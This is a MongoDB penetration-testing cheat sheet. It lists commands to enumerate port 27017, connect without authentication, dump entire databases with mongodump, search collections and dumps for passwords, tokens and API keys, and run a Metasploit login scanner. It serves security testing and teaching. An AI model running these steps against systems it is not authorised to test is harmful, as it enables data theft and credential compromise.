# MongoDB (27017)

!!! tip "Start here"
    Connect without credentials: `mongosh --host 10.10.10.10` (or legacy `mongo --host 10.10.10.10`). MongoDB before 3.6 bound to `0.0.0.0` by default with no authentication — unauthenticated access is still extremely common on internal deployments and exposed cloud instances.

---

## Enumeration

```bash
nmap -p 27017 -sV --script mongodb-info,mongodb-databases 10.10.10.10
mongosh --host 10.10.10.10 --eval "db.version()"
```

---

## Unauthenticated Access

```bash
mongosh --host 10.10.10.10
```

Once connected:

```javascript
show dbs                              // list databases
use <database>
show collections                      // list collections (tables)
db.<collection>.find().pretty()       // dump a collection
db.<collection>.count()               // row count
db.getUsers()                         // list MongoDB users
```

---

## Authenticated Access

```bash
mongosh --host 10.10.10.10 -u <user> -p <pass> --authenticationDatabase admin
```

---

## Dumping Databases

```bash
mongodump --host 10.10.10.10 --out ./mongo_dump
mongodump --host 10.10.10.10 -d <database> -c <collection> --out ./mongo_dump
```

Dump with authentication:

```bash
mongodump --host 10.10.10.10 -u <user> -p <pass> --authenticationDatabase admin --out ./mongo_dump
```

---

## Credential Hunting in Collections

Application databases frequently store hashed (sometimes cleartext) passwords, API tokens, and session data:

```javascript
// search every collection in every database for password fields
db.getCollectionNames().forEach(function(c) {
  db[c].find({password: {$exists: true}}).forEach(printjson);
});
```

Dump everything and grep offline — faster than querying interactively:

```bash
mongodump --host 10.10.10.10 --out ./mongo_dump
grep -riE 'password|token|api[_-]?key|secret' ./mongo_dump
```

---

## Metasploit Modules

```bash
use auxiliary/scanner/mongodb/mongodb_login
set RHOSTS 10.10.10.10
run
```

!!! tip "Real-world"
    MongoDB was responsible for one of the largest classes of data exposure incidents in the 2017-2019 timeframe — tens of thousands of internet-facing instances without authentication. Modern defaults (3.6+) bind to localhost and require auth, but internal deployments, development environments, and lift-and-shift migrations frequently end up back at the old configuration. Dump everything and treat it like an Elasticsearch index — the value is usually in application data, not the database engine itself.
